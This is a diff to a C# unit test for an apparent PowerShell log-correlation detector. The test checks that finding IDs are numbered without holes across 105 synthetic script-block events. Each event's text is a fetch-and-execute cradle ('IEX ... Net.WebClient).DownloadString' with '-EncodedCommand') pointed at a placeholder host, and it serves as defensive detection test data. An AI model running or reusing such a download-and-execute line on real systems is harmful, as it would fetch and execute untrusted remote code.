@@ -122,7 +122,7 @@ public class PowerShellCommandLineTests
     public void Only_the_listed_script_blocks_take_an_id_so_the_numbering_has_no_holes()
     {
         var blocks = Enumerable.Range(0, 105).Select(i => Ev("Microsoft-Windows-PowerShell/Operational", 4104, i, "", ("ScriptBlockId", "b" + i),
-            ("ScriptBlockText", "IEX (New-Object Net.WebClient).DownloadString('http://x') -EncodedCommand AAAA"))).ToArray();
+            ("ScriptBlockText", $"IEX (New-Object Net.WebClient).DownloadString('http://x/{i}') -EncodedCommand AAAA"))).ToArray();   // 105 distinct blocks: the same text is one finding
         var found = Correlation.Run(blocks);
         var numbers = found.Select(x => int.Parse(x.FindingId.AsSpan(2))).OrderBy(n => n).ToList();
         Assert.Equal(Enumerable.Range(1, numbers.Count), numbers);
